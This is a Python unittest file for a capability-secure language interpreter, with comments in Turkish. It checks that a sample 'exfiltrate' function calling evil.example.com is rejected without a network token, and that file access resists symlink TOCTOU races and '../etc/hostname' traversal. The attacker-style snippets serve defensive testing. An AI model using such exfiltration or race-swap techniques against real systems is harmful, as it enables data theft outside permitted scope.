from __future__ import annotations

import io
import os
import pathlib
import tempfile
import threading
import unittest
from contextlib import redirect_stderr, redirect_stdout

from koschei.capabilities import analyze, render, to_dict
from koschei.cli import main
from koschei.interpreter import _DIR_FD_SUPPORTED, DiskCaps, KsError
from koschei.parser import parse
from koschei.semantic import ImportedModule, SemanticError, check


EXFILTRATE = """
fn exfiltrate(net: NetCaps) {
    let response = net.get("https://evil.example.com") or ""
}
"""


class CapabilityContractRegressionTests(unittest.TestCase):
    def test_local_call_without_net_token_is_rejected(self) -> None:
        program = parse(EXFILTRATE + "fn main() { exfiltrate() }")
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(program)

    def test_string_cannot_impersonate_net_token(self) -> None:
        program = parse(
            EXFILTRATE
            + 'fn main() { exfiltrate("https://evil.example.com") }'
        )
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(program)

    def test_imported_call_without_net_token_is_rejected(self) -> None:
        dependency = parse(EXFILTRATE)
        declaration = dependency.declarations[0]
        imported = ImportedModule(
            "attack",
            {declaration.name: declaration},
            {},
        )
        root = parse("import attack fn main() { attack.exfiltrate() }")
        with self.assertRaisesRegex(SemanticError, "KS2401"):
            check(root, {"attack": imported})

    def test_capability_function_is_never_reported_as_pure(self) -> None:
        program = parse(EXFILTRATE + 'fn main() { println("safe") }')
        check(program)
        manifest = analyze(program)
        text = render(manifest, "attack.ks")
        payload = to_dict(manifest, "attack.ks")

        self.assertTrue(manifest.has_any)
        self.assertFalse(manifest.is_exact)
        self.assertIn("net", manifest.domains())
        self.assertIn("net", payload["required_domains"])
        self.assertNotIn("saf hesaplama", text)
        self.assertIn("capability çağıran tarafından sağlanmalıdır", text)
        self.assertIn("exfiltrate", text)

    def test_deny_net_blocks_unresolved_capability_requirement(self) -> None:
        source = EXFILTRATE + 'fn main() { println("safe") }'
        with tempfile.TemporaryDirectory() as directory:
            path = pathlib.Path(directory) / "attack.ks"
            path.write_text(source, encoding="utf-8")
            output = io.StringIO()
            error = io.StringIO()
            with redirect_stdout(output), redirect_stderr(error):
                exit_code = main(["caps", str(path), "--deny", "net"])

        self.assertEqual(exit_code, 2)
        self.assertIn("denied capability domain", error.getvalue())
        self.assertNotIn("saf hesaplama", output.getvalue())


class DiskTOCTOUConfinementTests(unittest.TestCase):
    """Disk kapsamı, yol metniyle değil dosya tanıtıcısıyla korunur.

    Eski uygulama `realpath` ile doğrulayıp AYRI bir çağrıda açıyordu.
    Sandbox'a yazabilen bir saldırgan aradaki pencerede normal dosyayı
    sembolik bağa çevirerek açmayı kapsam dışına yönlendirebiliyordu.
    Aşağıdaki testler bu pencereyi kapalı tutar.
    """

    def setUp(self) -> None:
        if not _DIR_FD_SUPPORTED:
            self.skipTest("openat (dir_fd) desteklenmiyor")

    def test_symlink_as_final_component_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as outside:
            secret = pathlib.Path(outside) / "gizli.txt"
            secret.write_text("SIZINTI", encoding="utf-8")
            with tempfile.TemporaryDirectory() as scope:
                link = pathlib.Path(scope) / "bag.txt"
                try:
                    link.symlink_to(secret)
                except (OSError, NotImplementedError):
                    self.skipTest("Symlink oluşturulamıyor")

                result = DiskCaps(scope).read_file(str(link))

        self.assertIsInstance(result, KsError)
        self.assertIn("KS3405", result.message)
        self.assertNotIn("SIZINTI", result.message)

    def test_symlink_as_intermediate_component_is_refused(self) -> None:
        """Ara bileşen bağı ELOOP değil ENOTDIR verir; yine de reddedilmeli."""
        with tempfile.TemporaryDirectory() as outside:
            (pathlib.Path(outside) / "gizli.txt").write_text(
                "SIZINTI", encoding="utf-8"
            )
            with tempfile.TemporaryDirectory() as scope:
                try:
                    (pathlib.Path(scope) / "kapi").symlink_to(outside)
                except (OSError, NotImplementedError):
                    self.skipTest("Symlink oluşturulamıyor")

                result = DiskCaps(scope).read_file(
                    str(pathlib.Path(scope) / "kapi" / "gizli.txt")
                )

        self.assertIsInstance(result, KsError)
        self.assertIn("KS3405", result.message)
        self.assertNotIn("SIZINTI", result.message)

    def test_symlink_pointing_inside_scope_is_also_refused(self) -> None:
        """Kapsam içini gösteren bağ bile takip edilmez.

        Kural 'bağın hedefi nerede' değil 'bağ var mı' üzerinedir; hedefi
        çözmek, çözme ile açma arasında yeniden pencere açardı.
        """
        with tempfile.TemporaryDirectory() as scope:
            (pathlib.Path(scope) / "asil.txt").write_text("ic", encoding="utf-8")
            try:
                (pathlib.Path(scope) / "bag.txt").symlink_to(
                    pathlib.Path(scope) / "asil.txt"
                )
            except (OSError, NotImplementedError):
                self.skipTest("Symlink oluşturulamıyor")

            result = DiskCaps(scope).read_file(str(pathlib.Path(scope) / "bag.txt"))

        self.assertIsInstance(result, KsError)
        self.assertIn("KS3405", result.message)

    def test_parent_traversal_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as scope:
            result = DiskCaps(scope).read_file(
                os.path.join(scope, "..", "etc", "hostname")
            )
        self.assertIsInstance(result, KsError)
        self.assertIn("KS3402", result.message)

    def test_scope_root_replacement_cannot_redirect_read(self) -> None:
        """Jeton oluşturulduktan sonra kök yol symlink ile değiştirilemez."""
        with tempfile.TemporaryDirectory() as parent, tempfile.TemporaryDirectory() as outside:
            scope = pathlib.Path(parent) / "scope"
            scope.mkdir()
            (scope / "veri.txt").write_text("KAPSAM-ICI", encoding="utf-8")
            outside_path = pathlib.Path(outside)
            (outside_path / "veri.txt").write_text(
                "ROOT-SWAP-SIZINTI", encoding="utf-8"
            )
            capability = DiskCaps(str(scope))

            anchored = pathlib.Path(parent) / "scope-anchored"
            scope.rename(anchored)
            try:
                scope.symlink_to(outside_path, target_is_directory=True)
            except (OSError, NotImplementedError):
                self.skipTest("Symlink oluşturulamıyor")

            result = capability.read_file(str(scope / "veri.txt"))

        self.assertEqual(result, "KAPSAM-ICI")
        self.assertNotIn("ROOT-SWAP-SIZINTI", str(result))

    def test_scope_root_replacement_cannot_redirect_write(self) -> None:
        with tempfile.TemporaryDirectory() as parent, tempfile.TemporaryDirectory() as outside:
            scope = pathlib.Path(parent) / "scope"
            scope.mkdir()
            (scope / "veri.txt").write_text("eski", encoding="utf-8")
            outside_path = pathlib.Path(outside)
            outside_file = outside_path / "veri.txt"
            outside_file.write_text("DOKUNMA", encoding="utf-8")
            capability = DiskCaps(str(scope))

            anchored = pathlib.Path(parent) / "scope-anchored"
            scope.rename(anchored)
            try:
                scope.symlink_to(outside_path, target_is_directory=True)
            except (OSError, NotImplementedError):
                self.skipTest("Symlink oluşturulamıyor")

            result = capability.write_file(str(scope / "veri.txt"), "YENI")
            anchored_value = (anchored / "veri.txt").read_text(encoding="utf-8")
            outside_value = outside_file.read_text(encoding="utf-8")

        self.assertNotIsInstance(result, KsError)
        self.assertEqual(anchored_value, "YENI")
        self.assertEqual(outside_value, "DOKUNMA")

    def test_scope_root_replacement_cannot_redirect_delete(self) -> None:
        with tempfile.TemporaryDirectory() as parent, tempfile.TemporaryDirectory() as outside:
            scope = pathlib.Path(parent) / "scope"
            scope.mkdir()
            (scope / "sil.txt").write_text("ic", encoding="utf-8")
            outside_path = pathlib.Path(outside)
            outside_file = outside_path / "sil.txt"
            outside_file.write_text("DOKUNMA", encoding="utf-8")
            capability = DiskCaps(str(scope))

            anchored = pathlib.Path(parent) / "scope-anchored"
            scope.rename(anchored)
            try:
                scope.symlink_to(outside_path, target_is_directory=True)
            except (OSError, NotImplementedError):
                self.skipTest("Symlink oluşturulamıyor")

            result = capability.delete(str(scope / "sil.txt"))
            anchored_exists = (anchored / "sil.txt").exists()
            outside_value = outside_file.read_text(encoding="utf-8")

        self.assertNotIsInstance(result, KsError)
        self.assertFalse(anchored_exists)
        self.assertEqual(outside_value, "DOKUNMA")

    def test_swap_race_never_leaks_outside_content(self) -> None:
        """Canlı yarış: saldırgan dosyayı sürekli bağa çevirirken okuma.

        Eski uygulamada bu döngü saniyeler içinde kapsam dışı içeriği
        sızdırıyordu. Yeni uygulamada okuma ya başarılı olur (kapsam içi
        gerçek dosya) ya da hata döner; kapsam dışı içerik ASLA dönmez.
        """
        secret_marker = "KAPSAM-DISI-SIZDI"
        with tempfile.TemporaryDirectory() as outside:
            target = pathlib.Path(outside) / "gizli.txt"
            target.write_text(secret_marker, encoding="utf-8")

            with tempfile.TemporaryDirectory() as scope:
                victim = pathlib.Path(scope) / "veri.txt"
                victim.write_text("zararsiz", encoding="utf-8")
                try:
                    os.symlink(target, pathlib.Path(scope) / "_probe")
                except (OSError, NotImplementedError):
                    self.skipTest("Symlink oluşturulamıyor")
                os.unlink(pathlib.Path(scope) / "_probe")

                capability = DiskCaps(scope)
                stop = threading.Event()

                def swapper() -> None:
                    while not stop.is_set():
                        try:
                            os.unlink(victim)
                            os.symlink(target, victim)
                            os.unlink(victim)
                            victim.write_text("zararsiz", encoding="utf-8")
                        except OSError:
                            pass

                worker = threading.Thread(target=swapper, daemon=True)
                worker.start()
                try:
                    for _ in range(25000):
                        result = capability.read_file(str(victim))
                        if isinstance(result, str):
                            self.assertNotIn(secret_marker, result)
                finally:
                    stop.set()
                    worker.join(timeout=5)


if __name__ == "__main__":
    unittest.main()
